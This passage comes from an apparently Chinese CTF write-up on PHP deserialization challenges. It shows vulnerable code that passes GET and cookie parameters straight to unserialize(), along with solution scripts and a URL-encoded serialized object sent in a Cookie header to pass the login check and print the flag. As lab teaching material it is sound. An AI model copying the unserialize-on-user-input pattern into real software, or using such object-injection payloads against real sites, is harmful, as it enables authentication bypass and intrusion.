    function __construct($user,$pass){
        $this->user=$user;
        $this->pass=$pass;
    }
    function login(){
        if ($this->user=="daydream" and $this->pass=="ok"){
            return 1;
        }
    }
}
$a=unserialize($_GET['param']);
if($a->login())
{
    echo $flag;
}
?> 
```

wp：

```php
<?php
include("flag.php");
class mylogin{
    var $user;
    var $pass;
    function __construct($user,$pass){
        $this->user=$user;
        $this->pass=$pass;
    }
    function login(){
        if ($this->user=="daydream" and $this->pass=="ok"){
            return 1;
        }
    }
}

$my = new mylogin("daydream", "ok");
echo serialize($my);
```

## 第三关

注意看：第三关和第二关的区别是：第三关是通过cookie传值的，考的是cookie反序列化

```php
<?php
highlight_file(__FILE__);
include("flag.php");
class mylogin{
    var $user;
    var $pass;
    function __construct($user,$pass){
        $this->user=$user;
        $this->pass=$pass;
    }
    function login(){
        if ($this->user=="daydream" and $this->pass=="ok"){
            return 1;
        }
    }
}
$a=unserialize($_COOKIE['param']);
if($a->login())
{
    echo $flag;
}
?> 
```

wp:

```
<?php
highlight_file(__FILE__);
include("flag.php");
class mylogin{
    var $user;
    var $pass;
    function __construct($user,$pass){
        $this->user=$user;
        $this->pass=$pass;
    }
    function login(){
        if ($this->user=="daydream" and $this->pass=="ok"){
            echo "Success";
            return 1;
        }
    }
}
$a=unserialize($_COOKIE['param']);
$a->login();
```

在HTTP request中添加如下字段：

```
Cookie: param=O%3a7%3a"mylogin"%3a2%3a{s%3a4%3a"user"%3bs%3a8%3a"daydream"%3bs%3a4%3a"pass"%3bs%3a2%3a"ok"%3b}
```

